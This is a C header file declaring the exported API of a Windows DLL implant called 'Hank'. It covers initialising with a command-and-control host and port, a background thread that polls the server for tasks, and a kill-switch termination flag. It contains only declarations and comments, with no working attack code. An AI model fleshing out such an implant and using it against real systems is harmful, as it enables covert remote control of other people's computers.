#pragma once
#include <Windows.h>

#include "command.h"
#include "debug.h"
#include "network.h"
#include "protocol.h"

#ifdef Hank_EXPORTS
#define Hank_API __declspec(dllexport)
#else
#define Hank_API __declspec(dllimport)
#endif

/**
 * @brief Initializes the implant runtime with a polling target.
 *
 * The runtime refuses initialization if a prior killimplant request has marked
 * the implant for termination.
 *
 * @param host The target C2 host name or IP address.
 * @param port The target C2 port as a wide string.
 *
 * @return TRUE on success, or FALSE if the implant has already been terminated.
 */
Hank_API BOOL HankInitialize(PCWSTR host, PCWSTR port);

/**
 * @brief Starts the polling loop thread for the implant runtime.
 *
 * If no active polling thread exists, this function starts a single background
 * thread that periodically checks the server for queued tasks.
 *
 * @return TRUE on success, or FALSE if thread creation fails.
 */
Hank_API BOOL HankStart(VOID);

/**
 * @brief Terminates the implant runtime and performs debug cleanup checks.
 *
 * This function requests implant termination, stops the polling loop, and runs
 * the debug heap validation helpers.
 *
 * @return VOID
 */
Hank_API VOID HankStop(VOID);

/**
 * @brief Requests full implant termination.
 *
 * After this function is called, future initialization attempts should fail.
 *
 * @return VOID
 */
VOID RequestImplantTermination(VOID);

/**
 * @brief Reports whether the implant has been marked for termination.
 *
 * @return TRUE if a killimplant request has been issued, otherwise FALSE.
 */
BOOL IsImplantTerminationRequested(VOID);
